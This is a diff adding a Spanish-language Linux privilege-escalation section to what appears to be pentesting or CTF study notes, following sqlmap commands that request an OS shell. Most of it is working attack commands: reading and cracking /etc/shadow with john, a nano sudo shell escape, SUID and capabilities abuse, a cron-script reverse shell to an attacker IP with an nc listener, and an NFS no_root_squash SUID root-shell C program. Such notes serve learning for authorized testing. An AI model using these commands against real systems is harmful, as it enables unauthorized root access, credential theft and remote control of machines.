@@ -252,3 +252,104 @@ sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dsl
 PARA OBTENER LA OS SHELL
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --os-shell
 ```
+## Privilege Escalation
+Recuerda: Usuario + contrasena + IP --> SSH
+```
+nmap -sV -p 22 [ip red]
+ssh [username]@[ip]
+```
+Aqui hay que intentar primero lo mas sencillo, lo comun, recuerda utilizar siempre la opcion ls -la para mostrar archivos ocultos (por si acaso)
+
+```
+whoami
+id (niveles de privilegios)
+sudo -l (ver que comandos puede ejecutar el usuario con el comando sudo, y los binarios que se pueden ejecutar como root sin password)
+ps -A (ve todos los procesos en ejecucion)
+cat /etc/passwd | grep home (ver los usuarios disponibles en la maquina)
+```
+**Kernel Exploit**
+```
+uname -a (la version del Kernel es la primera version que sale en la salida del comando)
+Se busca algún CVE, con exploit (exploit-db). Recomendación: https://www.linuxkernelcves.com/cves
+gcc [archivo_exploit_descarga.c] -o [archivo salida_sin_extension] (compila el exploit, que es un programa en C)
+./[archivo salida_sin_extension]
+id (se verifica la escalada de privilegios)
+```
+**sudo**
+```
+sudo -l
+sudo nano (si esta dentro de los binarios permitidos de ejecutar como root sin psswd)
+CTRL+R 
+CTRL+X
+reset; sh 1>&0 2>&0
+MIENTRAS SE EJECUTA ESE COMANDO EN NANO SE BUSCAN LOS HASHES de los usuarios
+cat /etc/shadow
+```
+**Crackear contrasenas de usuarios en la maquina**
+Esto se podria hacer con algun binario que se pueda ejecutar como root ya sea porque esta en sudo -l o tiene el bit SUID activo
+```
+nano /etc/shadow > shadow.txt
+nano /etc/passwd > passwd.txt
+unshadow passwd.txt shadow.txt > passwords.txt
+john --wordlist=[wordlist como rockyou] passwords.txt
+```
+**Bit SUID:** Se ejecuta el binario con los privilegios del usuario propietario
+https://gtfobins.github.io
+```
+find / -type f -perm -04000 -ls 2>/dev/null (Enlista archivos que tienen los bits SUID y SGID activos)
+
+base64 /etc/passwd | base64 --decode (si base64 aparece con el bit suid activo, este comando permite visualizar el archivo)
+```
+**Capabilities**
+```
+getpcap -r / 2>/dev/null (este comando permite ver las capacidades almacenadas en un archivo o directorio, en este caso en el directorio /)
+Se busca en gtfo algun exploit para capabilities en un binario
+```
+**CRON JOBS**
+```
+cat /etc/crontab (VER SCRIPTS QUE SE ESTEN EJECUTANDO, EL QUE PUEDA VER O MODIFICAR ES ESE)
+cat [script]
+nano [script]
+SE COLOCA ESTO EN EL SCRIPT PARA ABRIR UNA REVERSE SHELL A LA MAQUINA DEL ATACANTE:
+#!/bin/bash
+bash -i >& /dev/tcp/[IP_ATACANTE o 127.0.0.1]/6666 0>&1
+
+chmod +x backup.sh
+
+EN LA MAQUINA DEL ATACANTE:
+
+nc -nlvp 6666
+
+(SE ABRE LA REVERSE SHELL, para hacer el mismo proceso de cracking de contrasenas para el usuario, /etc/passwd y /etc/shadow )
+```
+**NFS**
+Si la opción "no_root_squash" está presente en un recurso compartido con permisos de escritura, podemos crear un ejecutable con el bit SUID activado y ejecutarlo en el sistema de destino.
+```
+EN LA MAQUINA VICTIMA:
+cat /etc/exports (IDENTIFICAR LAS CARPETAS COMPARTIDAS WRITABLE Y "no_root_squash"
+
+EN LA MAQUINA LOCAL:
+
+showmount -e [ip victima] (veo cuales son las carpetas compartidas donde se pueden montar archivos)
+mkdir [directorio que se va a montar en la maquina]
+mount -o rw [ip victima]:/[carpeta compartida de la victima] [carpeta que se va a montar]
+cd [carpeta montada]
+pluma nfs.c 
+
+CONTENIDO DEL ARCHIVO nfs.c:
+
+int main ()
+{  setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return(0);
+}
+
+gcc nfs.c -o nfs -w (se compila)
+chmod +s nfs (se le da el bit SUID)
+
+
+MAQUINA VICTIMA:
+cd [carpeta montada]
+./nfs (SE EJECUTA EL SCRIPT, Y WE AREEE ROOT!!!)
+```
